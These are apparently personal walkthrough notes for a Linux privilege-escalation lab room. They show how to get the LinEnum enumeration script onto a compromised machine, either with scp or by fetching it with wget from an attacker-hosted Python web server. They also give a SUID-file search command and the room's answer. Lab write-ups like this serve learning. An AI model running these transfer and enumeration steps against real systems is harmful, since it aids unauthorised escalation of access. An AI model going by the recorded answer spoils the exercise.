LinEnum is a bash script that searches for possible ways to priv esc. It is incredibly popular due to the sheer amount of possible methods that it checks for, and often times Linenum is one of the first things to try when you get shell access.

Methods to get Linenum on the system  

##### Method 1: SCP  

Since you have ssh access on the machine you can use SCP to copy files over. In the case of Linenum you would run 
```
scp {path to linenum} {user}@{host}:{path}
```

Example: `scp /opt/LinEnum.sh pingu@10.10.10.10:/tmp` would put LinEnum in /tmp.

```
scp LinEnum.sh pingu@10.10.80.7:/tmp
```
![[Pasted image 20240327195305.png]]


##### Method 2: SimpleHTTPServer  

SimpleHTTPServer is a module that hosts a basic webserver on your host machine. Assuming the machine you compromised has a way to remotely download files, you can host LinEnum and download it.

```
python3 -m http.server 9000
```

![[Pasted image 20240327195621.png]]

```
wget http://10.8.194.147:9000/LinEnum.sh
```
![[Pasted image 20240327200623.png]]

![[Pasted image 20240327200722.png]]


Note: There are numerous ways to do this and the two listed above are just my personal favorites.  

Once You have LinEnum on the system, its as simple as running it and looking at the output above once it finishes.  

Answer the questions below

| Question                                                  | Answer           | SS                                   |
| --------------------------------------------------------- | ---------------- | ------------------------------------ |
| What is the interesting path of the interesting suid file | /opt/secret/root | ![[Pasted image 20240328212200.png]] |

*Locate SUID files:*
```
find / -perm -u=s -type f 2>/dev/null_
```

![[Pasted image 20240328212203.png]]

*Using LinEnum:*

![[Pasted image 20240328212520.png]]
